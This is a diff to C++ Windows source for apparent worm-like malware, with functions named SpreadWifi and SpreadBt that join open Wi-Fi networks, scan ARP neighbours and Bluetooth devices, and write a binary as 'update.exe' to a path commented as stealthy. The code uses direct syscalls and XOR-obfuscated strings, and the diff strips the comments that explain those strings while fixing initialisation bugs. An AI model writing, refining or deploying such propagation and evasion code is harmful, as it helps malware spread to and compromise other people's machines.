@@ -110,6 +110,7 @@ namespace {
 
         HANDLE hFile = NULL;
         IO_STATUS_BLOCK ioStatus;
+        RtlZeroMemory(&ioStatus, sizeof(ioStatus));
 
         NTSTATUS status = InternalDoSyscall(ntCreateFileSsn,
             &hFile,
@@ -126,6 +127,7 @@ namespace {
 
         if (!NT_SUCCESS(status)) return false;
 
+        // NtWriteFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key)
         status = InternalDoSyscall(ntWriteFileSsn,
             hFile,
             NULL,
@@ -145,13 +147,8 @@ namespace {
     }
 
     std::wstring GenerateOpenProfileXml(const std::wstring& ssid) {
-        // Using xor_wstr for obfuscation of the XML tags
-        // Pre-obfuscated segments (XOR with 0x5A)
-        // "<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>"
         std::wstring part1 = utils::xor_wstr(L"\x66\x65\x22\x37\x36\x7a\x2c\x3f\x28\x29\x33\x35\x34\x67\x78\x6b\x74\x6a\x78\x65\x64\x66\x0d\x16\x1b\x14\x0a\x28\x35\x3c\x33\x36\x3f\x7a\x22\x37\x36\x34\x29\x67\x78\x32\x2e\x2e\x2a\x60\x75\x75\x2d\x2d\x2d\x74\x37\x33\x39\x28\x35\x29\x35\x3c\x2e\x74\x39\x35\x37\x75\x34\x3f\x2e\x2d\x35\x28\x31\x33\x34\x3d\x75\x0d\x16\x1b\x14\x75\x2a\x28\x35\x3c\x33\x36\x3f\x75\x2c\x6b\x78\x64\x66\x34\x3b\x37\x3f\x64", 99);
-        // "</name><SSIDConfig><SSID><name>"
         std::wstring part2 = utils::xor_wstr(L"\x66\x75\x34\x3b\x37\x3f\x64\x66\x09\x09\x13\x1e\x19\x35\x34\x3c\x33\x3d\x64\x66\x09\x09\x13\x1e\x64\x66\x34\x3b\x37\x3f\x64", 31);
-        // "</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>open</authentication><encryption>none</encryption><useOneX>false</useOneX></authEncryption></security></MSM></WLANProfile>"
         std::wstring part3 = utils::xor_wstr(L"\x66\x75\x34\x3b\x37\x3f\x64\x66\x75\x09\x09\x13\x1e\x64\x66\x75\x09\x09\x13\x1e\x19\x35\x34\x3c\x33\x3d\x64\x66\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x0e\x23\x2a\x3f\x64\x1f\x09\x09\x66\x75\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x0e\x23\x2a\x3f\x64\x66\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x17\x35\x3e\x3f\x64\x3b\x2f\x2e\x35\x66\x75\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x17\x35\x3e\x3f\x64\x66\x17\x09\x17\x64\x66\x29\x3f\x39\x2f\x28\x33\x2e\x23\x64\x66\x3b\x2f\x2e\x32\x1f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x66\x3b\x2f\x2e\x32\x3f\x34\x2e\x33\x39\x3b\x2e\x33\x35\x34\x64\x35\x2a\x3f\x34\x66\x75\x3b\x2f\x2e\x32\x3f\x34\x2e\x33\x39\x3b\x2e\x33\x35\x34\x64\x66\x3f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x34\x35\x34\x3f\x66\x75\x3f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x66\x2f\x29\x3f\x15\x34\x3f\x02\x64\x3c\x3b\x36\x29\x3f\x66\x75\x2f\x29\x3f\x15\x34\x3f\x02\x64\x66\x75\x3b\x2f\x2e\x32\x1f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x66\x75\x29\x3f\x39\x2f\x28\x33\x2e\x23\x64\x66\x75\x17\x09\x17\x64\x66\x75\x0d\x16\x1b\x14\x0a\x28\x35\x3c\x33\x36\x3f\x64", 243);
 
         return part1 + ssid + part2 + ssid + part3;
@@ -161,6 +158,7 @@ namespace {
         std::vector<std::string> ips;
         ULONG size = 0;
         GetIpNetTable(NULL, &size, FALSE);
+        if (size == 0) return ips;
         std::vector<BYTE> buffer(size);
         PMIB_IPNETTABLE pTable = (PMIB_IPNETTABLE)buffer.data();
         if (GetIpNetTable(pTable, &size, FALSE) == NO_ERROR) {
@@ -210,7 +208,8 @@ std::string SpreadWifi(const std::string& targetSsid = "") {
                 }
 
                 if (shouldConnect) {
-                    WLAN_CONNECTION_PARAMETERS connParams = {};
+                    WLAN_CONNECTION_PARAMETERS connParams;
+                    RtlZeroMemory(&connParams, sizeof(connParams));
                     connParams.wlanConnectionMode = wlan_connection_mode_temporary_profile;
                     connParams.strProfile = NULL;
                     connParams.pDot11Ssid = &net.dot11Ssid;
@@ -253,9 +252,7 @@ std::string SpreadWifi(const std::string& targetSsid = "") {
 
         // Stealthy path: C:\Users\Public\Documents\update.exe
         // NT path: \??\C:\Users\Public\Documents\update.exe
-        // C:\Users\Public\Documents is more likely to exist by default.
         std::wstring targetPath = L"\\??\\C:\\Users\\Public\\Documents";
-
         std::wstring fullTargetPath = targetPath + L"\\update.exe";
 
         if (SyscallWriteFile(fullTargetPath, binary)) {
@@ -293,8 +290,9 @@ std::string SpreadWifi(const std::string& targetSsid = "") {
 }
 
 std::string SpreadBt() {
-    // Bluetooth discovery stub
-    BLUETOOTH_DEVICE_SEARCH_PARAMS searchParams = { sizeof(BLUETOOTH_DEVICE_SEARCH_PARAMS) };
+    BLUETOOTH_DEVICE_SEARCH_PARAMS searchParams;
+    RtlZeroMemory(&searchParams, sizeof(searchParams));
+    searchParams.dwSize = sizeof(searchParams);
     searchParams.fReturnAuthenticated = TRUE;
     searchParams.fReturnRemembered = TRUE;
     searchParams.fReturnUnknown = TRUE;
@@ -303,7 +301,10 @@ std::string SpreadBt() {
     searchParams.cTimeoutMultiplier = 2;
     searchParams.hRadio = NULL;
 
-    BLUETOOTH_DEVICE_INFO deviceInfo = { sizeof(BLUETOOTH_DEVICE_INFO) };
+    BLUETOOTH_DEVICE_INFO deviceInfo;
+    RtlZeroMemory(&deviceInfo, sizeof(deviceInfo));
+    deviceInfo.dwSize = sizeof(deviceInfo);
+
     HBLUETOOTH_DEVICE_FIND hFind = BluetoothFindFirstDevice(&searchParams, &deviceInfo);
 
     std::string report = "BT_SCAN_RESULTS:\n";
